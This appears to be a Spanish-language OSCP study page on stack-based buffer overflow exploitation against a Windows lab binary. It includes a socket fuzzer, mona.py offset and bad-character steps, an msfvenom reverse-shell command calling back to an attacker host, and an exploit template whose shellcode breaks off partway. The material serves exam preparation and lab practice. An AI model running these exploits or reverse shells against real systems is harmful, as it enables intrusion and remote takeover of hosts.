<!DOCTYPE HTML>
<html lang="es" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>OSCP Buffer Overflow - Secronomicón</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../guides/oscp_bof/index.html" class="active"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Secronomicón</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="oscp-metodología-stack-based"><a class="header" href="#oscp-metodología-stack-based">OSCP Metodología Stack Based</a></h1>
<h2 id="objetivo"><a class="header" href="#objetivo">Objetivo</a></h2>
<p>Como parte de la práctica para el examen me di a la tarea de realizar esta guía para futuras consultas y aclaración de dudas, esperando que sirva de ayuda para cualquiera que se este preparando para la certificación. Adicional, para tener un compendio más práctico realice una síntesis de los comandos utilizados disponibles en esta <a href="../../cheat_sheets/pwning/bof-oscp.html">Cheat Sheet</a>.</p>
<h2 id="configuración-de-ambiente-de-práctica"><a class="header" href="#configuración-de-ambiente-de-práctica">Configuración de ambiente de práctica</a></h2>
<ol>
<li>Deshabilitar firewall y/o habilitar reglas para comunicación a través de red.</li>
<li>Deshabilitar protección DEP de Windows.</li>
<li>Instalación de herramientas (binario, immunity debugger, <code>mona.py</code>).</li>
<li>Generación de workspace para <code>mona.py</code>.</li>
</ol>
<h3 id="firewall"><a class="header" href="#firewall">Firewall</a></h3>
<h4 id="traza-icmp"><a class="header" href="#traza-icmp">Traza ICMP</a></h4>
<p>En la sección de configuración avanzada habilitar reglas <strong>tanto de entrada como de salida</strong> de ICMP v4 y v6 para permitir comunicación entre la máquina que se ocupará para debuggear el binario y la máquina de donde se lanzará el exploit.</p>
<p><img src="./images/bof_1.png" alt="Reglas de Firewall" /></p>
<h3 id="deshabilitado-de-dep"><a class="header" href="#deshabilitado-de-dep">Deshabilitado de DEP</a></h3>
<p>En un command prompt como administrador ejecutar: <code>bcdedit.exe /set {current} nx AlwaysOff</code> para deshabilitar la <em>prevención de ejecución de datos (DEP)</em>. Después de ejecutarlo y reiniciar el sistema se puede validar que se deshabilitó correctamente entrando a <code>Panel de Control &gt; Sistema y seguridad &gt; Sistema &gt; Configuración avanzada del sistema &gt; Opciones avanzadas &gt; Configuración (de rendimiento) &gt; Prevención de ejecución de datos</code> este deberá salir sombreado de gris.</p>
<p><img src="./images/bof_2.png" alt="Deshabilitado de DEP" /></p>
<ol>
<li>Configuración avanzada del sistema.</li>
<li>Configuración de rendimiento.</li>
<li>Pestaña de prevención de ejecución de datos.</li>
<li>Sombreado gris de correcto deshabilitado.</li>
</ol>
<h3 id="instalación-de-herramientas-mona"><a class="header" href="#instalación-de-herramientas-mona">Instalación de herramientas (Mona)</a></h3>
<p>Para añadir el script de <code>mona.py</code> a inmmunity debugger, es necesario descargar el script del <a href="https://github.com/corelan/mona">repositorio</a> y meterlo en la ruta <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code>.</p>
<p><img src="./images/bof_3.png" alt="Deshabilitado de DEP" /></p>
<h3 id="generación-de-workspace-para-monapy-opcional"><a class="header" href="#generación-de-workspace-para-monapy-opcional">Generación de workspace para <code>mona.py</code> (opcional)</a></h3>
<p>Para facilitar el uso de <code>mona.py</code>, se puede generar un entorno de trabajo (a secas es una carpeta) que contendría lo que <code>mona.py</code> genere a partir de los comandos que se utilicen (payloads, patrones, badchars, etc). Ejecutando <code>!mona config -set workingfolder C:\Users\SrRequiem\Desktop\%p</code> se indicaría el lugar y a partir del primer comando de <code>mona.py</code> que genere archivos, se podrá ver reflejado en el sistema de archivos.</p>
<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
<p>En esta sección se realiza la búsqueda del punto de quiebre del binario. Identificando el número de caracteres que causen un fallo de segmentación.</p>
<h3 id="plantilla-de-fuzzer"><a class="header" href="#plantilla-de-fuzzer">Plantilla de fuzzer</a></h3>
<pre><code class="language-python">#from pwn import *
import socket, sys, time

if len(sys.argv) &lt; 2:
   print &quot;\n[!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt; &quot; + &quot;&lt;remote-port&gt;\n&quot;
   sys.exit(0)
# Variables globales
ip_address = sys.argv[1]
rport = int(sys.argv[2])

if __name__ == '__main__':
   contador = 100
   #p1 = log.progress(&quot;Data&quot;) Log de datos en pwntools
   while True:
      #p1.status(f&quot;Enviando {contador} bytes.&quot;) Log de datos en pwntools
      print &quot;Enviando %s bytes.&quot; % contador
      buffer = 'A' * contador
      try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip_address, rport))

         data = s.recv(1024)
         #s.send(&quot;USER srrequiem\r\n&quot;)
         #data = s.recv(1024)
         s.send(&quot;%s\r\n&quot; % buffer)
         data = s.recv(1024)
         contador += 100
         #En algunas ocasiones no suele romperse la conexion lo que evita entrar
         #al codigo de la excepcion por lo que se puede considerar meter un sleep
         #para visualizar en que valor de la iteracion se pausa la ejecucion del binario
         time.sleep(1)
      except Exception as ex:
         print &quot;\n[!] Ha habido un error de conexion\n&quot;
         print ex
         sys.exit(1)
</code></pre>
<p>Por medio del script se puede buscar el cambio del <code>EIP</code> de manera automática.</p>
<p><img src="./images/bof_4.png" alt="Cambio de valor de EIP" /></p>
<p><strong>Generacion de patrón</strong></p>
<p><code>msf-pattern_create -l &lt;longitud de bytes&gt;</code></p>
<p><code>!mona pattern_create &lt;longitud de bytes&gt;</code></p>
<p>Después de provocar el fallo con el patrón, la dirección <code>EIP</code> se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga <code>EIP</code> ahora lo identificaremos para saber el offset específico.</p>
<p><img src="./images/bof_5.png" alt="EIP con valor de patrón" /></p>
<p><strong>Identificación offset</strong></p>
<p><code>msf-pattern_create -l &lt;EIP&gt;</code></p>
<p><code>!mona pattern_offset &lt;EIP&gt;</code></p>
<p><img src="./images/bof_6.png" alt="EIP con valor de patrón" /></p>
<ol>
<li>Offset.</li>
<li>EIP.</li>
</ol>
<p><em>Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente. Ejemplo: 1052 'A' y 4 'B' en este caso el <code>EIP</code> valdría <code>42424242</code></em></p>
<h2 id="identificar-bad-chars"><a class="header" href="#identificar-bad-chars">Identificar Bad Chars</a></h2>
<h3 id="manual"><a class="header" href="#manual">Manual</a></h3>
<p>Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy fácil perder algún byte de vista muy fácil.</p>
<p>El proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del <code>ESP</code> y buscar cuales son los que no se visualizan correctamente, identificandolos así uno a uno. Se puede generar la colección de bytes con <code>mona.py</code> con el comando <code>!mona bytearray</code> dentro de Immunity Debugger para tener la colección y poder incorporarla al payload.</p>
<h4 id="colección-plana"><a class="header" href="#colección-plana">Colección plana</a></h4>
<p><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</code></p>
<h4 id="colección-en-arreglo"><a class="header" href="#colección-en-arreglo">Colección en arreglo</a></h4>
<pre><code class="language-python">badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
)
</code></pre>
<p>Después de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del <code>ESP</code> dándo click derecho en el registro y seleccionando la opción <code>Follow in Dump</code>, de la sección ubicada en la esquina inferior izquierda se nos desplegará el contenido del registro para poder identificar los badchars manualmente.</p>
<p><img src="./images/bof_11.png" alt="Follow in Dump Immunity Debugger" /></p>
<p>Se anexan ejemplos de cómo se verían los badchars en el dump de hexadecimal (sección inferior izquierda de Immunity Debugger).</p>
<p><img src="./images/bof_12.png" alt="Ejemplo Badchar 1" /></p>
<p><img src="./images/bof_13.png" alt="Ejemplo Badchar 2" /></p>
<h3 id="automático"><a class="header" href="#automático">Automático</a></h3>
<p>El proceso se puede optimizar usando <code>mona.py</code> de manera iterativa, con los siguientes comandos <code>mona.py</code> nos devolverá los badchars identificados.</p>
<ol>
<li><code>!mona bytearray</code>: Generará archivos con arreglo de badchars.</li>
<li><code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;dirección de ESP&gt;</code>: Comparará los badchars contenidos respecto al payload ubicado en el <code>ESP</code> (recordando que payload = filler + eip + badchars).</li>
<li><code>!mona bytearray -cpb '\x00'</code>: Generará archivos con arreglo de badchars exceptuando los indicados.</li>
<li>Repetir proceso hasta encontrar todos los badchars.</li>
</ol>
<h2 id="búsqueda-de-dirección"><a class="header" href="#búsqueda-de-dirección">Búsqueda de dirección</a></h2>
<p>Aquí se realiza la búsqueda de la instrucción <code>JMP ESP</code> (valores hexadecimales <code>\xff\xe4</code>) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por <code>mona.py</code> en <code>False</code>).</p>
<p><em>Nota: se puede hacer uso de <code>msf-nasm_shell</code> para ver el valor de los <code>OP codes</code> (en este caso <code>jmp ESP</code>) en caso que se requiera.</em></p>
<p><img src="./images/bof_7.png" alt="OP code jmp ESP" /></p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona modules</code></p>
<p><strong>Ejemplo</strong></p>
<p><img src="./images/bof_8.png" alt="Mona modules" /></p>
<h3 id="búsqueda-de-apuntador-en-dll"><a class="header" href="#búsqueda-de-apuntador-en-dll">Búsqueda de apuntador en dll</a></h3>
<p>Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción <code>\xff\xe4</code>.</p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona find -s &quot;\xff\xe4&quot; -m &lt;nombre de dll&gt;</code></p>
<p>Se desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (<code>PAGE_EXECUTE_READ</code>); y de escritura solamente (<code>PAGE_READ_ONLY</code>), <strong>hay que tomar en cuenta sólo aquellas que cuenten con ejecución</strong> (<code>PAGE_EXECUTE_READ</code>). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (<code>False</code>).</p>
<p><img src="./images/bof_9.png" alt="JMP ESP en dll" /></p>
<ol>
<li>Comando.</li>
<li>Direcciones útiles para usar en EIP (buscar aquellas que en el valor de la dirección no contenga ningún badchar).</li>
<li>Permisos.</li>
<li>Protecciones.</li>
</ol>
<h2 id="generación-de-shellcode"><a class="header" href="#generación-de-shellcode">Generación de shellcode</a></h2>
<p>Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la <code>EIP</code>.</p>
<p><strong>Comando de ejemplo</strong></p>
<p><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code></p>
<p>Tener en consideración:</p>
<ul>
<li>Sistema operativo.</li>
<li>Arquitectura.</li>
<li>Payload.</li>
<li>Formato (python, c, exe, etc).</li>
<li>Variables de escucha y/o comando a ejecutar.</li>
<li>Encoding (extra: <code>-i 3</code> para número de iteraciones para encodear).</li>
<li>BadChars.</li>
<li>Función de salida (para evitar que el proceso termine usar <code>seh</code> o <code>thread</code>).</li>
</ul>
<p><em><strong>Si se da el caso que los badchars sean bastantes tal que la generación del shellcode no se realice satisfactoriamente, considerar quitar el encoder <code>x86/shikata_ga_nai</code> para que automáticamente se utilicé el encoder que cumpla con los requisitos (colección de badchars a evitar).</strong></em></p>
<h2 id="generación-de-exploit"><a class="header" href="#generación-de-exploit">Generación de exploit</a></h2>
<h3 id="ejemplo-de-exploit-final"><a class="header" href="#ejemplo-de-exploit-final">Ejemplo de exploit final</a></h3>
<pre><code class="language-python">from struct import pack
import socket, sys

if len(sys.argv) &lt; 2:
    print &quot;\n [!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt;&quot; + &quot;&lt;remote-port&gt; \n&quot;
    sys.exit(0)

ip_address = sys.argv[1]
rport = int(sys.argv[2])
shellcode =  b&quot;&quot;
shellcode += b&quot;\xb8\x36\xda\x75\x0f\xda\xd5\xd9\x74\x24\xf4\x5b\x2b&quot;
shellcode += b&quot;\xc9\xb1\x5f\x83\xc3\x04\x31\x43\x10\x03\x43\x10\xd4&quot;
shellcode += b&quot;\x2f\xce\x68\xaf\x10\x8c\xac\x01\x49\x9b\x76\x69\x30&quot;
shellcode += b&quot;\x55\xbe\x20\x9d\xa4\x1a\x57\x9d\x2d\x66\x54\xfb\xa0&quot;
shellcode += b&quot;\x75\xc8\xf6\x32\x68\x08\x59\x9b\x32\x1d\xb8\x35\x8a&quot;
shellcode += b&quot;\x2e\x1c\xec\x8c\x49\xea\xa6\xae\xc5\xfb\xef\x11\xbd&quot;
shellcode += b&quot;\xa9\x1f\x9b\xf3\x51\xc8\x4a\x27\x35\xa2\xd1\x60\x03&quot;
